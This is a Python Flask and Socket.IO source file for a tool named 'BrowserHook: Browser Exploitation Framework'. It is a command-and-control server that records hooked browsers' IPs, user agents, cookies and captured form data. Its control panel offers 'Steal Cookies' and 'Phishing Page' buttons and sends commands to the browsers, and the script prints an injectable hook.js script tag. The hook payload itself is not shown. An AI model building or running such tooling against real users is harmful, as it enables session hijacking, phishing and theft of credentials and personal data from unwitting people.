import argparse
import sqlite3
import os
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
from datetime import datetime

app = Flask(__name__)
socketio = SocketIO(app)
hooked_browsers = {}

# Database setup
def init_db():
    conn = sqlite3.connect('browserhook.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS browsers
                 (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, cookies TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS form_data
                 (browser_id TEXT, data TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

# Store browser data
def store_browser(browser_id, ip, user_agent, cookies):
    conn = sqlite3.connect('browserhook.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO browsers (id, ip, user_agent, cookies, last_seen) VALUES (?, ?, ?, ?, ?)",
              (browser_id, ip, user_agent, cookies, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# Store form data
def store_form_data(browser_id, data):
    conn = sqlite3.connect('browserhook.db')
    c = conn.cursor()
    c.execute("INSERT INTO form_data (browser_id, data, timestamp) VALUES (?, ?, ?)",
              (browser_id, data, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# Web UI
@app.route('/')
def index():
    conn = sqlite3.connect('browserhook.db')
    c = conn.cursor()
    c.execute("SELECT id, ip, user_agent, last_seen FROM browsers")
    browsers = c.fetchall()
    conn.close()
    return render_template('index.html', browsers=browsers)

# API to get browser details
@app.route('/browser/<browser_id>')
def get_browser(browser_id):
    conn = sqlite3.connect('browserhook.db')
    c = conn.cursor()
    c.execute("SELECT * FROM browsers WHERE id = ?", (browser_id,))
    browser = c.fetchone()
    c.execute("SELECT data, timestamp FROM form_data WHERE browser_id = ?", (browser_id,))
    form_data = c.fetchall()
    conn.close()
    return jsonify({'browser': browser, 'form_data': form_data})

# Execute command
@app.route('/execute/<browser_id>/<command>')
def execute_command(browser_id, command):
    if browser_id in hooked_browsers:
        socketio.emit('command', {'command': command}, room=browser_id)
        return jsonify({'status': 'Command sent'})
    return jsonify({'status': 'Browser not hooked'})

# WebSocket events
@socketio.on('connect_browser')
def handle_connect(data):
    browser_id = data['id']
    ip = request.remote_addr
    user_agent = data['user_agent']
    cookies = data['cookies']
    hooked_browsers[browser_id] = request.sid
    store_browser(browser_id, ip, user_agent, cookies)
    emit('connected', {'status': 'Hooked'}, room=request.sid)
    socketio.emit('browser_update', {'id': browser_id, 'ip': ip, 'user_agent': user_agent})

@socketio.on('form_data')
def handle_form_data(data):
    browser_id = data['id']
    form_data = data['data']
    store_form_data(browser_id, form_data)
    socketio.emit('form_update', {'browser_id': browser_id, 'data': form_data})

def main():
    parser = argparse.ArgumentParser(description="BrowserHook: Browser Exploitation Framework")
    parser.add_argument('--host', default='0.0.0.0', help="Host to bind (default: 0.0.0.0)")
    parser.add_argument('--port', type=int, default=3000, help="Port to bind (default: 3000)")
    args = parser.parse_args()

    # Initialize database
    init_db()

    # Ensure templates and static directories exist
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)

    # Create index.html template
    with open('templates/index.html', 'w') as f:
        f.write('''
<!DOCTYPE html>
<html>
<head>
    <title>BrowserHook Control Panel</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.min.js"></script>
</head>
<body>
    <h1>BrowserHook Control Panel</h1>
    <h2>Hooked Browsers</h2>
    <ul id="browsers">
        {% for browser in browsers %}
        <li>
            <a href="#" onclick="loadBrowser('{{ browser[0] }}')">{{ browser[1] }} ({{ browser[2] }}) - Last seen: {{ browser[3] }}</a>
            <button onclick="executeCommand('{{ browser[0] }}', 'steal_cookies')">Steal Cookies</button>
            <button onclick="executeCommand('{{ browser[0] }}', 'phishing')">Phishing Page</button>
        </li>
        {% endfor %}
    </ul>
    <div id="browser-details"></div>
    <script>
        var socket = io();
        socket.on('browser_update', function(data) {
            $('#browsers').append('<li><a href="#" onclick="loadBrowser(\\'' + data.id + '\\')">' + data.ip + ' (' + data.user_agent + ')</a>' +
                '<button onclick="executeCommand(\\'' + data.id + '\\', \\'steal_cookies\\')">Steal Cookies</button>' +
                '<button onclick="executeCommand(\\'' + data.id + '\\', \\'phishing\\')">Phishing Page</button></li>');
        });
        socket.on('form_update', function(data) {
            $('#browser-details').append('<p>Form Data: ' + data.data + '</p>');
        });
        function loadBrowser(id) {
            $.get('/browser/' + id, function(data) {
                $('#browser-details').html('<h3>Browser Details</h3>' +
                    '<p>ID: ' + data.browser[0] + '</p>' +
                    '<p>IP: ' + data.browser[1] + '</p>' +
                    '<p>User Agent: ' + data.browser[2] + '</p>' +
                    '<p>Cookies: ' + data.browser[3] + '</p>' +
                    '<h4>Form Data</h4>' +
                    data.form_data.map(d => '<p>' + d[0] + ' (' + d[1] + ')</p>').join(''));
            });
        }
        function executeCommand(id, command) {
            $.get('/execute/' + id + '/' + command, function(data) {
                alert(data.status);
            });
        }
    </script>
</body>
</html>
        ''')

    print(f"[*] Starting BrowserHook on http://{args.host}:{args.port}/ui/panel")
    print(f"[*] Hook URL: <script src='http://{args.host}:{args.port}/hook.js'></script>")
    socketio.run(app, host=args.host, port=args.port)

if __name__ == "__main__":
    main()